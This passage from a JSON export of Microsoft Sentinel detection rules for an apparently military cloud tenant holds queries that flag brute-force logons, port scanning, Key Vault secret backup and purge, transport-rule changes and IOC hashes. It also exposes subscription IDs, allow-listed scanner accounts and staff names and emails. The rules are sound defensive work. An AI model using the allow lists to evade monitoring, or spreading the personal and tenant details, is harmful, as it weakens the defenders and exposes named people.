ProcessCommandLine contains @\"--source=msstore\") // store to download microsoft apps for cmd\nor (ProcessCommandLine contains \"AppxPackage\" \nand ProcessCommandLine contains @\"Microsoft.WindowsStore\" // store to download microsoft apps for PS\nand ProcessCommandLine !contains @\"Remove-AppxPackage\")) // removing apps is not a concern\n| project TimeGenerated, AccountUpn, MachineGroup, DeviceName, InitiatingProcessAccountName, InitiatingProcessAccountDomain, FolderPath, SHA1","suppressionDuration":"PT1H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"InitiatingProcessAccountName"},{"identifier":"NTDomain","columnName":"InitiatingProcessAccountDomain"}]},{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"DeviceName"}]},{"entityType":"FileHash","fieldMappings":[{"identifier":"Value","columnName":"SHA1"}]}],"tactics":["DefenseEvasion"],"techniques":["T0820"],"displayName":"BAH_Defender-Windows_Store_Apps","enabled":true,"description":"Detects on Windows Store application installation attempts through usage of the 'winget' command. Previously this analytic was purposed to detect on any or all installations of applications through the Windows store for any false positives or legitimate hits. This will be able to detect on attempts through either Microsoft Store via cmd or PS.","alertRuleTemplateName":null,"lastModifiedUtc":"2023-10-26T13:31:57.060738Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/b42b4210-a0d1-4f27-886b-eaa875f69f16","name":"b42b4210-a0d1-4f27-886b-eaa875f69f16","etag":"\"0b010feb-0000-2700-0000-646e3c650000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//Author: Steven Wan\n//Description: Detects powershell running from a Windows Store installation. This was used in a red team assesment where powershell was installed via the Windows Store prior to the host being provisioned.\n//False Positives: None known\nDeviceProcessEvents\n| where ActionType == 'ProcessCreated'\n| where FolderPath startswith @\"C:\\Program Files\\WindowsApps\\Microsoft.PowerShell\" and FolderPath endswith \"pwsh.exe\"\n| join kind=leftouter DeviceFileCertificateInfo on $left.SHA1 == $right.SHA1\n| project TimeGenerated, DeviceName, InitiatingProcessAccountName, InitiatingProcessAccountDomain, FolderPath, Issuer, Signer, SHA1","suppressionDuration":"PT1H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"DeviceName"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"InitiatingProcessAccountName"},{"identifier":"NTDomain","columnName":"InitiatingProcessAccountDomain"}]},{"entityType":"FileHash","fieldMappings":[{"identifier":"Value","columnName":"SHA1"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["DefenseEvasion"],"techniques":["T0820"],"displayName":"BAH_Defender-Windows_Store_Powershell","enabled":true,"description":"Detects powershell running from a windows store instalation\nThis was used in a red team assesment where powershell was installed via the windows store prior to the host being provisioned","alertRuleTemplateName":null,"lastModifiedUtc":"2023-05-24T16:33:40.3342231Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/91659b93-0a5c-4ec8-a998-a06c6ad6a45c","name":"91659b93-0a5c-4ec8-a998-a06c6ad6a45c","etag":"\"870043ec-0000-2700-0000-66fdcb3b0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT30M","queryPeriod":"PT30M","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"// Author: Rob Russell\n// Description: looks for abnormal use of userenv.dll in association with MS Teams\n// any unsigned use of userenv.dll should be investigated\n// supports DTO 22-0484\n// False Positives: No known false positives at this time\nlet uenvfilefolder = dynamic([@'C:\\Windows\\System32\\userenv.dll', @'C:\\Windows\\SysWOW64\\userenv.dll']);\nlet signInLookup = (\nSigninLogs\n| where TimeGenerated >= ago(1d) // this could be expensive, should we keep it?\n| where DeviceDetail contains \"displayName\"\n| extend DeviceDetailJson = parse_json(DeviceDetail)\n| extend DeviceNameSI = tostring(DeviceDetailJson.displayName)\n| distinct DeviceNameSI, UserPrincipalName, UserDisplayName\n);\nDeviceImageLoadEvents\n| where FileName =~ \"USERENV.dll\"\n| where not(FolderPath has_any (uenvfilefolder))\n| join kind=leftouter DeviceFileCertificateInfo on $left.SHA1 == $right.SHA1\n| extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\n| join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\n| project TimeGenerated, UserPrincipalName, DeviceName, FileName, SHA256, FolderPath, SignatureType, Signer","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"UserPrincipalName"}]},{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"DeviceName"}]},{"entityType":"File","fieldMappings":[{"identifier":"Name","columnName":"FileName"},{"identifier":"Directory","columnName":"FolderPath"}]},{"entityType":"FileHash","fieldMappings":[{"identifier":"Value","columnName":"SHA256"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Execution","Persistence","PrivilegeEscalation","DefenseEvasion","CredentialAccess","Discovery"],"techniques":["T1129","T1574","T1562","T1027","T1003","T1518"],"displayName":"BAH_DTO 22-0484 Behavior","enabled":true,"description":"// Description: looks for abnormal use of userenv.dll in association with MS Teams\n// any unsigned use of userenv.dll should be investigated\n// supports DTO 22-0484\n// False Positives: No known false positives at this time\nPLATFORM:Windows\nMITRE:TA0003;T10889","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:37:45.7305614Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/3c09d891-dc7d-451b-8f83-b4f82c1ef7a1","name":"3c09d891-dc7d-451b-8f83-b4f82c1ef7a1","etag":"\"4200e9a5-0000-2700-0000-65328d710000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT30M","queryPeriod":"PT30M","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"//Author: Ginna Woo\r\n//Description: Looks for IOCs related to DTO 22-0484.\r\n//False Positive(s): No known false positive reported at this time.\r\nlet hashlist = externaldata(MD5:string)[@\"https://dod365csspstorage.blob.core.usgovcloudapi.net/dto-22-0484/MD5_hashlist.csv\"] with (format=\"csv\", ignoreFirstRecord=True);\r\n(union isfuzzy=True\r\n    (\r\n    union withsource=TableName Device* //looks at any table titled \"Device\" \r\n    | where MD5 has_any (hashlist)//checks for any MD5 in the hashlist\r\n    )\r\n| project TimeGenerated, AccountDomain, AccountName, FileName, FileOriginIP, SHA256, MD5, DeviceName, DeviceObjectId\r\n)","suppressionDuration":"PT1H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["PrivilegeEscalation","DefenseEvasion"],"techniques":["T1055"],"displayName":"BAH_IOCs_Related_to_DTO 22-0484","enabled":true,"description":"Looks for IOCs related to DTO 22-0484.","alertRuleTemplateName":null,"lastModifiedUtc":"2023-10-20T14:23:44.631104Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/164da98a-3173-4cbb-bcc5-bdfbea57e99f","name":"164da98a-3173-4cbb-bcc5-bdfbea57e99f","etag":"\"870081f7-0000-2700-0000-66fdcbf10000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT30M","queryPeriod":"PT30M","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"// Author: Steven Wan, Rob Russell\n// Description: Detects devices that may be performing scanning activity\n// If something connects to more than the remotePortCountThreshold within the analytic time period it will fire an alert\n// False positives: Legitimate scanning activity like MDE device discovery\nlet remotePortCountThreshold = 10;\nlet signInLookup = (\n    SigninLogs\n    | where TimeGenerated >= ago(1d)\n    | where DeviceDetail contains \"displayName\"\n    | extend DeviceDetailJson = parse_json(DeviceDetail)\n    | extend DeviceNameSI = tostring(DeviceDetailJson.displayName)\n    | distinct DeviceNameSI, UserPrincipalName, UserDisplayName\n    );\nDeviceNetworkEvents\n| where ipv4_is_private(RemoteIP)\n| where RemotePort < 1024 // System or well-known ports only\n| summarize make_set(RemotePort)\n    by\n    DeviceName,\n    RemoteIP,\n    InitiatingProcessFileName,\n    InitiatingProcessFolderPath,\n    InitiatingProcessCommandLine\n| extend RemotePortList = array_sort_asc(set_RemotePort)\n| where array_length(set_RemotePort) > remotePortCountThreshold\n| extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\n| join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\n| extend ScanningType = iif(InitiatingProcessCommandLine contains @\"C:\\ProgramData\\Microsoft\\Windows Defender Advanced Threat Protection\\Downloads\\PSScript_\", \"MDE Device Discovery\", \"Unknown\")\n| where ScanningType != \"MDE Device Discovery\" // remove to show MDE Device Discovery \n| project\n    UserPrincipalName,\n    DeviceName,\n    ScanningType,\n    InitiatingProcessFileName,\n    InitiatingProcessFolderPath,\n    InitiatingProcessCommandLine,\n    RemoteIP,\n    RemotePortList\n","suppressionDuration":"PT1H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"UserPrincipalName"}]},{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"DeviceName"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"RemoteIP"}]},{"entityType":"File","fieldMappings":[{"identifier":"Name","columnName":"InitiatingProcessFileName"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Reconnaissance"],"techniques":["T1595"],"displayName":"BAH_Defender-DiscoverHostsNetworkScanning","enabled":false,"description":"Looking for high volume queries against a given RemoteIP, per DeviceName, RemotePort and Process.\nPLATFORM:Windows\nMITRE:TA0043;T1595","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:40:49.1599322Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/5418b5ac-99d6-4fcf-af40-4c43f61cedab","name":"5418b5ac-99d6-4fcf-af40-4c43f61cedab","etag":"\"8700f5f5-0000-2700-0000-66fdcbd40000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//Author: Steven Wan\n// Description: This analytics looks for a pattern of multiple failed logon events from the same remote IP address, within a short time frame, that is then followed by a successful logon event. Such a pattern suggests that an attacker tried brute force methods that eventually succeeded. It is possible that this analytic will produce false positives for a legitimate user forgetting a password, but they should be locked out of a single account before this anlaytic fires off.\n// False Positives: Can be triggered by mass scanning. Currently known nessus usernames have been allow listed but this could fail if the account name srtucture changes\nlet scanning = dynamic([@\"nessus_adm\", @\"nessus_mbr\", @\"nessus\", @\"svc-forescout.wks\", @\"sccm-clientpush.wks\", @\"acas\"]);\nDeviceLogonEvents\n| where isnotempty(RemoteIP)\n    and AccountName !endswith \"$\" and AccountName !endswith \"wks\"\n    and not (AccountName has_any (scanning)) // nessus scanning accounts\n//  and RemoteIPType == \"Public\" //Disabled to ensure both private and public are caught\n| extend Account=strcat(\"AccountDomain: \", AccountDomain, \" AccountName: \", AccountName)\n| summarize\n    Successful=countif(ActionType == \"LogonSuccess\"),\n    Failed = countif(ActionType == \"LogonFailed\"),\n    FailedAccountsCount = dcountif(Account, ActionType == \"LogonFailed\"),\n    SuccessfulAccountsCount = dcountif(Account, ActionType == \"LogonSuccess\"),\n    FailedAccounts = make_set_if(Account, ActionType == \"LogonFailed\"),\n    SuccessfulAccounts = make_set_if(Account, ActionType == \"LogonSuccess\")\n    by DeviceName, RemoteIP, RemoteIPType\n| where Failed > 8\n    and Successful > 0\n    and FailedAccountsCount > 2\n    and SuccessfulAccountsCount == 1","suppressionDuration":"PT1H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"entityMappings":[{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"DeviceName"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"RemoteIP"}]},{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"FailedAccounts"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess"],"techniques":["T1078"],"displayName":"BAH_Defender-MultipleFailedLogons","enabled":true,"description":"This analytics looks for a pattern of multiple failed logon events from the same remote IP address, within a short time frame, that is then followed by a successful logon event. Such a pattern suggests that an attacker tried brute force methods that eventually succeeded. It is possible that this analytic will produce false positives for a legitimate user forgetting a password, but they should be locked out of a single account before this anlaytic fires off.\nPLATFORM:Windows\nMITRE:TA0001;T1078;T1078.002;T1078;T1078.003","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:40:19.3014976Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/4031a20e-02f2-46b1-9de1-ce62aab83a31","name":"4031a20e-02f2-46b1-9de1-ce62aab83a31","etag":"\"87006eef-0000-2700-0000-66fdcb690000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT4H","queryPeriod":"P2D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//Author: Stephen Rowley\n//Description: This analytic looks for new subscriptions in the tenant based on changes to the SubscriptionInventory_CL table\n//False Positives: It is possible to have a false positive during the first few runs of the Logic App (Detect-NewSubscriptions) while it builds the table, but no false positives should occur after that.\nSubscriptionInventory_CL\n| summarize arg_min(TimeGenerated, *) by SubscriptionId\n| where TimeGenerated >= ago(4h)\n| project TimeGenerated, displayName_s, state_s, SubscriptionId","suppressionDuration":"PT1H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"displayName_s"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Persistence","CredentialAccess","Impact"],"techniques":["T1003","T1098","T1496"],"displayName":"BAH_Detect-NewAzureSubscriptiontoTenant","enabled":true,"description":"This analytic looks for new subscriptions in the tenant based on changes to the SubscriptionInventory_CL table.   Results of this analytic will need deconflicted through DEOS Engineering, as we (CSSP) do not have eyes on what subscriptions are allowed or not allowed to be added or disabled.\nPLATFORM:Microsoft 365,Azure AD,IaaS,Windows\nMITRE:TA0003;T1098,TA0006;T1003,TA0040;T1496","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:38:31.975742Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/8dbdfe10-43d2-4c8d-a2df-3f5109bf5544","name":"8dbdfe10-43d2-4c8d-a2df-3f5109bf5544","etag":"\"3d00d596-0000-2700-0000-641c8ab40000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"//Detect changes to Azure AD Conditional Access policies on weekends or outside of business hours and who made the change.\r\n//Maintenence window is Thursday evenings starting at approx. 5:00 PM EST\r\n//Change submitted to CI-CD 28 November by Brandon Conn (brandon.j.conn3.civ@dod365.adm.mil)\r\n//Data connector required for this query - Azure Active Directory - Audit Logs\r\nlet Saturday = time(6.00:00:00);\r\nlet Sunday = time(0.00:00:00);\r\nAuditLogs\r\n| where OperationName has \"conditional access\"\r\n// extend LocalTime to your time zone\r\n| extend LocalTime=TimeGenerated + 5h\r\n// Change hours of the day to suit your company, i.e this would find activations between 6pm and 6am\r\n| where dayofweek(LocalTime) in (Saturday, Sunday) or hourofday(LocalTime) !between (6 .. 18)\r\n| extend ['Conditional Access Policy Name'] = tostring(TargetResources[0].displayName)\r\n| extend Actor = tostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName)\r\n| project LocalTime, \r\n    OperationName, \r\n    ['Conditional Access Policy Name'], \r\n    Actor\r\n| sort by LocalTime desc","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"OperationName"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["DefenseEvasion"],"techniques":[],"displayName":"Detect Conditional Access Changes After Hours","enabled":false,"description":"Detect changes to Azure AD Conditional Access policies on weekends or outside of business hours.\n","alertRuleTemplateName":null,"lastModifiedUtc":"2023-03-23T17:21:56.0248636Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/81a517b9-e4e8-4be6-b43e-6303d4bdf7bf","name":"81a517b9-e4e8-4be6-b43e-6303d4bdf7bf","etag":"\"8700e2f8-0000-2700-0000-66fdcc080000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT30M","queryPeriod":"PT30M","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//Author: Steven Wan    \n//Description: Looks for common domains used with torrent sites or files\n//False Positives: Could detect a benign domain related to torrents. Some torrents are used for non malicious purposes.\nlet signInLookup = (\nSigninLogs\n| where TimeGenerated >= ago(1d)\n| where DeviceDetail contains \"displayName\"\n| extend DeviceDetailJson = parse_json(DeviceDetail)\n| extend DeviceNameSI = tostring(DeviceDetailJson.displayName)\n| distinct DeviceNameSI, UserPrincipalName, UserDisplayName\n);\nlet torrentIDs = dynamic([\"torrent\", \"vuze\", \"azureus\"]);\nDeviceNetworkEvents \n| where RemoteUrl has_any (torrentIDs)\n    or RemoteUrl endswith \".tor\"\n    or InitiatingProcessFileName has_any(torrentIDs) \n| extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\n| join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\n| project\n    TimeGenerated,\n    UserPrincipalName,\n    ReportId,\n    DeviceName,\n    DeviceId,\n    InitiatingProcessFileName,\n    RemoteUrl,\n    RemoteIP,\n    RemotePort  \n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":false,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"DeviceName"}]},{"entityType":"Host","fieldMappings":[{"identifier":"AzureID","columnName":"DeviceId"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"RemoteIP"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Exfiltration"],"techniques":[],"displayName":"BAH_Defender-DetectTorrentUse","enabled":true,"description":"Custom detection to find use of torrenting software or browsing related to torrents.\nPLATFORM:Windows\nMITRE:TA0010;T1048","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:41:10.9018255Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/fa669cd6-e5d2-48af-a36a-ec64a09efbbb","name":"fa669cd6-e5d2-48af-a36a-ec64a09efbbb","etag":"\"8700be4e-0000-2700-0000-66fdc0f10000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"// Name: Exchange Online transport rule\n// Description: Identifies when a Exchange Online transport rule is changed or created. This is a rare activity that could severly affect mail flow if done imporperly. The Group is a small team in DEOS Engineering. Jonas Lahr (jlahr@dod365.onmicrosoft.us), Jacob Lavender (jlavender@dod365.onmicrosoft.us), Larry Underwood (lunderwood@dod365.onmicrosoft.us), Corey Radesky (cradesky@dod365.onmicrosoft.us), and Robert Bunch (rbunch@dod365.onmicrosoft.us) are known engineers tasked with changing these at this time.\n// requiredDataConnectors:\n//  - connectorId: Office365\n// dataTypes:\n//  - OfficeActivity (Exchange)\n// tactics:\n//  - Exfiltration\nOfficeActivity\n| where OfficeWorkload == \"Exchange\"\n| where Operation in~ (\"New-TransportRule\", \"Set-TransportRule\")\n| mv-apply DynamicParameters = todynamic(Parameters) on (summarize ParsedParameters = make_bag(pack(tostring(DynamicParameters.Name), DynamicParameters.Value)))\n| extend RuleName = case(\n    Operation =~ \"Set-TransportRule\", OfficeObjectId,\n    Operation =~ \"New-TransportRule\", ParsedParameters.Name,\n    \"Unknown\")\n| mv-expand ExpandedParameters = todynamic(Parameters)\n| extend RedirectTo = ExpandedParameters.Value\n| extend ClientIPValues = extract_all(@'\\[?(::ffff:)?(?P<IPAddress>(\\d+\\.\\d+\\.\\d+\\.\\d+)|[^\\]]+)\\]?([-:](?P<Port>\\d+))?', dynamic([\"IPAddress\", \"Port\"]), ClientIP)[0]\n| project\n    TimeGenerated,\n    IPAddress = tostring(ClientIPValues[0]),\n    Port = tostring(ClientIPValues[1]),\n    UserId,\n    Operation,\n    RuleName,\n    Parameters\n| extend\n    timestamp = TimeGenerated,\n    AccountCustomEntity = UserId,\n    IPCustomEntity = IPAddress;\n// entityMappings:\n// - entityType: Account\n//      FullName: AccountCustomEntity\n// - entityType: IP\n//      Address: IPCustomEntity","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPCustomEntity"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Exfiltration"],"techniques":[],"displayName":"Exchange Online Transport Rule","enabled":true,"description":"Identifies when a Exchange Online transport rule is changed or created. This is a rare activity that could severely affect mail flow if done improperly. The Group is a small team in DEOS Engineering. \nPLATFORM:Microsoft 365,IaaS\nMITRE:TA0005;T1562;T1562.008,TA0009;T1114;T1114.002;T1114.003","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T21:53:52.3870396Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/4234b3ce-1d01-4f70-9890-087b8101bf1e","name":"4234b3ce-1d01-4f70-9890-087b8101bf1e","etag":"\"7b002cb5-0000-2700-0000-64c3c1960000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Low","query":"let SensitiveOperationList = dynamic(\n[\"VaultDelete\", \"KeyDelete\", \"SecretDelete\", \"SecretPurge\", \"KeyPurge\", \"SecretBackup\", \"KeyBackup\"]);\nAzureDiagnostics\n| where ResourceType =~ \"VAULTS\" and ResultType =~ \"Success\"\n| where OperationName in~ (SensitiveOperationList)\n| extend ResultType = column_ifexists(\"ResultType\", \"NoResultType\"), \nrequestUri_s = column_ifexists(\"requestUri_s\", \"None\"), \nidentity_claim_oid_g = column_ifexists(\"identity_claim_oid_g\", \"None\"), CallerIPAddress = column_ifexists(\"CallerIPAddress\", \"None\"), \nclientInfo_s = column_ifexists(\"clientInfo_s\", \"None\"), \nidentity_claim_upn_s = column_ifexists(\"identity_claim_upn_s\", \"None\")\n| summarize EventCount=count(), StartTimeUtc=min(TimeGenerated), EndTimeUtc=max(TimeGenerated), TimeTriggered=make_list(TimeGenerated),OperationNameList=make_set(OperationName), RequestURLList=make_set(requestUri_s), CallerIPList = make_set(CallerIPAddress),  CallerIPMax= arg_max(CallerIPAddress,*) by ResourceType, ResultType, Resource, identity_claim_upn_s, clientInfo_s\n| extend timestamp = StartTimeUtc\n| extend Name = tostring(split(identity_claim_upn_s,'@',0)[0]), UPNSuffix = tostring(split(identity_claim_upn_s,'@',1)[0])","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"Name"},{"identifier":"UPNSuffix","columnName":"UPNSuffix"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"CallerIPMax"}]}],"templateVersion":"1.0.3","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Impact"],"techniques":["T1485"],"displayName":"Sensitive Azure Key Vault operations","enabled":true,"description":"Identifies when sensitive Azure Key Vault operations are used. This includes: VaultDelete, KeyDelete, SecretDelete, SecretPurge, KeyPurge, SecretBackup, KeyBackup.\nAny Backup operations should match with expected scheduled backup activity.","alertRuleTemplateName":"d6491be0-ab2d-439d-95d6-ad8ea39277c5","lastModifiedUtc":"2023-07-28T13:24:37.4071836Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/6ef693b8-d643-4886-ae39-cb8886a29f50","name":"6ef693b8-d643-4886-ae39-cb8886a29f50","etag":"\"88003806-0000-2700-0000-66fdcce70000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Low","query":"//Title: BAH_Browser_Notification_Adware_Phishing\n//Author: Rob Russell, Steven Wan\n//Description: Looks for possible notification phishing where user's subscribe to browser notifications. Searches for the command line switches that contains --notification and parses the results for analysis.\n// https://source.chromium.org/chromium/chromium/src/+/main:chrome/common/chrome_switches.cc?q=kNotificationLaunchId&ss=chromium\n// more details here\n// https://www.rapid7.com/blog/post/2021/10/28/sneaking-through-windows-infostealer-malware-masquerades-as-windows-application/\n// https://www.mcafee.com/blogs/other-blogs/mcafee-labs/scammers-impersonating-windows-defender-to-push-malicious-windows-apps/\n// https://www.mcafee.com/blogs/other-blogs/mcafee-labs/how-to-stop-the-popups/\n//False Positives: common domains where people subscribe to notifications such as teams, web mail, slack and facebook. Use domainAllowList to allow list items\n\nlet tld_regex = @\"(?:[a-zA-Z]*\\.)+(?P<tld>[a-zA-Z]+)(?:\\/.*)?\";\nlet maliciousurllist = externaldata(DateAdded:string,IoC:string,Type:string) [@\"https://malware-filter.gitlab.io/malware-filter/urlhaus-filter-online.txt\"] with (format=\"csv\", ignoreFirstRecord=True);\nlet signInLookup = (\nSigninLogs\n//| 